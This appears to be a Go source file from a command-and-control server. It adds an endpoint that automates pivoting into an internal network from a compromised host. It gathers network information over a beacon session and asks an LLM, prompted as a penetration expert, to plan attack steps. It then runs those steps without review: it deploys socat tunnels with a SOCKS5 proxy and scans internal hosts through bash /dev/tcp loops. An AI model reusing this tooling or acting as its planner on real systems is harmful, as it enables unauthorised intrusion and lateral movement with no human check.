package server

// c2_tunnel_ai.go — AI 一键内网穿透：
//   POST /api/tools/c2/tunnel/auto     一键穿透（AI 驱动全自动）
//   POST /api/tools/c2/tunnel/stop     一键停止（已有，增强清理）
//
// AI 一键流程：
//   1) 信息收集：从 beacon 获取内网 IP 段、路由表、ARP 表
//   2) AI 分析：LLM 判断哪些网段值得穿透、哪些内网服务有价值
//   3) 自动建立隧道：SOCKS5 + 目标端 socat（自动选端口）
//   4) 验证连通性：通过隧道探测内网服务
//   5) 结果汇报：穿透了哪些网段、发现了哪些服务

import (
	"os/exec"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// ---- AI 一键穿透 ----

// c2TunnelAutoPrompt AI 分析内网信息并规划穿透。
const c2TunnelAutoPrompt = `你是内网渗透专家。根据目标机的网络信息，规划内网穿透策略。

输入：目标机的网络接口、路由表、ARP 表信息。
输出：严格的 JSON 数组，每个元素是一条穿透动作：
[
  {"action":"tunnel","reason":"为什么要穿透这个网段"},
  {"action":"scan","target":"要扫描的内网 IP 或网段","ports":"端口列表","reason":"为什么扫描"},
  {"action":"probe","target":"IP:端口","reason":"为什么要探测这个服务"}
]

规则：
1. 最多 5 条动作（保守执行）
2. tunnel 动作最多 1 条（建一条 SOCKS 隧道就够）
3. 优先扫描目标机所在 /24 网段的常见端口（22,80,443,3306,5432,6379,8080,8443）
4. 如果发现新的存活主机，探测其开放服务
5. 输出只含 JSON，不要围栏、不要解释

只输出 JSON。`

// C2TunnelAction AI 规划的穿透动作。
type C2TunnelAction struct {
	Action string `json:"action"` // tunnel / scan / probe
	Target string `json:"target"`
	Ports  string `json:"ports"`
	Reason string `json:"reason"`
}

// TunnelAutoResult 一键穿透结果。
type TunnelAutoResult struct {
	Step    string `json:"step"`
	Detail  string `json:"detail"`
	Output  string `json:"output"`
	OK      bool   `json:"ok"`
}

// POST /api/tools/c2/tunnel/auto — AI 一键穿透。
func (s *Server) c2TunnelAuto(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID  string `json:"session_id"`
		Hostname   string `json:"hostname"`
		InternalIP string `json:"internal_ip"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}

	results := []TunnelAutoResult{}

	// 第 1 步：信息收集（网络接口+路由+ARP）
	networkInfo, err := s.c2ExecAndWait(r, b.SessionID,
		"ip -4 addr show | grep 'inet ' | grep -v '127.0.0.1'; echo '---'; ip route | head -10; echo '---'; cat /proc/net/arp 2>/dev/null | head -10")
	if err != nil {
		writeErr(w, 502, "信息收集失败: "+err.Error())
		return
	}
	results = append(results, TunnelAutoResult{Step: "信息收集", Detail: "网络接口/路由/ARP", Output: truncateStr(networkInfo, 500), OK: true})

	// 第 2 步：AI 分析规划
	profileID := s.reviewerProfileID()
	if profileID == 0 {
		if p, err := s.m.pg.ActiveProfile(); err == nil && p != nil {
			profileID = p.ID
		}
	}
	prov, _, ok := s.providerForProfile(profileID)
	if !ok {
		writeErr(w, 502, "LLM 不可用")
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	prompt := fmt.Sprintf("目标主机 %s (%s) 的网络信息：\n%s\n\n请规划内网穿透策略：", b.Hostname, b.InternalIP, truncateStr(networkInfo, 2000))
	aiRaw, err := streamCollectText(ctx, prov, c2TunnelAutoPrompt, prompt)
	if err != nil {
		results = append(results, TunnelAutoResult{Step: "AI 分析", Detail: err.Error(), OK: false})
		writeJSON(w, 200, map[string]any{"data": results})
		return
	}

	// 剥代码围栏
	aiRaw = strings.TrimSpace(aiRaw)
	if i := strings.Index(aiRaw, "["); i >= 0 {
		if j := strings.LastIndex(aiRaw, "]"); j > i {
			aiRaw = aiRaw[i : j+1]
		}
	}
	var actions []C2TunnelAction
	if err := json.Unmarshal([]byte(aiRaw), &actions); err != nil || len(actions) == 0 {
		results = append(results, TunnelAutoResult{Step: "AI 分析", Detail: "AI 输出解析失败（可能是分析性回答）", Output: truncateStr(aiRaw, 500), OK: false})
		writeJSON(w, 200, map[string]any{"data": results})
		return
	}
	results = append(results, TunnelAutoResult{Step: "AI 分析", Detail: fmt.Sprintf("规划 %d 条动作", len(actions)), OK: true})

	// 第 3 步：执行动作
	for _, act := range actions {
		switch act.Action {
		case "tunnel":
			// 建立隧道
			remotePort := 13400 + len(tunnelState.Tunnels)*10
			if err := s.c2TunnelDeploy(r, b.SessionID, b.Hostname, b.InternalIP, remotePort, nil); err != nil {
				results = append(results, TunnelAutoResult{Step: "建立隧道", Detail: err.Error(), OK: false})
				continue
			}
			if !tunnelState.SocksRunning {
				if err := s.c2SocksStart(11080); err != nil {
					results = append(results, TunnelAutoResult{Step: "SOCKS5", Detail: fmt.Sprintf("目标 socat :%d 已部署，SOCKS5: %s", remotePort, err.Error()), OK: true})
					continue
				}
			}
			results = append(results, TunnelAutoResult{
				Step: "建立隧道", OK: true,
				Detail: fmt.Sprintf("SOCKS5 :%d + 目标 socat :%d 已建立", tunnelState.SocksPort, remotePort),
			})
			s.c2Audit(b.SessionID, b.Hostname, "tunnel_auto", "AI auto tunnel")

		case "scan":
			// 内网扫描（以目标机为跳板）
			ports := act.Ports
			if ports == "" {
				ports = "22,80,443,3306,5432,6379,8080,8443"
			}
			cmd := fmt.Sprintf(`bash -c 'for p in %s; do (echo >/dev/tcp/%s/$p) 2>/dev/null && echo "OPEN %s:$p"; done; echo SCAN-DONE'`, ports, act.Target, act.Target)
			out, err := s.c2ExecAndWait(r, b.SessionID, cmd)
			if err != nil {
				results = append(results, TunnelAutoResult{Step: "内网扫描 " + act.Target, Detail: err.Error(), OK: false})
				continue
			}
			open := strings.Count(out, "OPEN")
			results = append(results, TunnelAutoResult{
				Step: "内网扫描 " + act.Target, OK: true,
				Detail: fmt.Sprintf("发现 %d 个开放端口", open),
				Output: truncateStr(out, 300),
			})

		case "probe":
			// 探测服务
			parts := strings.SplitN(act.Target, ":", 2)
			if len(parts) != 2 {
				continue
			}
			cmd := fmt.Sprintf(`bash -c '(echo >/dev/tcp/%s/%s) 2>/dev/null && echo "ALIVE %s" || echo "DEAD %s"'`, parts[0], parts[1], act.Target, act.Target)
			out, err := s.c2ExecAndWait(r, b.SessionID, cmd)
			if err != nil {
				continue
			}
			alive := strings.Contains(out, "ALIVE")
			results = append(results, TunnelAutoResult{
				Step: "探测 " + act.Target, OK: alive,
				Detail: map[bool]string{true: "服务存活", false: "不可达"}[alive],
			})
		}
	}

	// 汇总
	tunnelState.mu.Lock()
	tunnelCount := len(tunnelState.Tunnels)
	socksPort := tunnelState.SocksPort
	socksRunning := tunnelState.SocksRunning
	tunnelState.mu.Unlock()

	summary := fmt.Sprintf("完成：SOCKS5 %s（:%d），%d 条隧道。浏览器连 socks5://127.0.0.1:%d 即可穿透内网。",
		map[bool]string{true: "运行中", false: "未启动"}[socksRunning], socksPort, tunnelCount, socksPort)
	if socksRunning {
		results = append(results, TunnelAutoResult{Step: "完成", Detail: summary, OK: true})
	}

	writeJSON(w, 200, map[string]any{"data": results})
}

// POST /api/tools/c2/tunnel/stop（增强版：清全部 socat/gost + 状态归零）
func (s *Server) c2TunnelStopEnhanced(w http.ResponseWriter, r *http.Request) {
	// 杀目标端 socat
	for _, t := range tunnelState.Tunnels {
		if t.Status == "active" {
			_, _ = s.c2ExecAndWait(r, t.SessionID, fmt.Sprintf("pkill -f 'TCP-LISTEN:%d' 2>/dev/null; echo OK", t.RemotePort))
			s.c2Audit(t.SessionID, t.Hostname, "tunnel_stop", "")
		}
	}
	// 杀平台端
	c2SocksStop()
	tunnelState.Tunnels = nil
	// 额外清理残留 socat
	_ = execCommand("pkill", "-f", "socat.*TCP-LISTEN:13")
	writeJSON(w, 200, map[string]any{"ok": true, "message": "隧道已全部停止并清理"})
}

// execCommand 简单包装。
func execCommand(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	return cmd.Run()
}
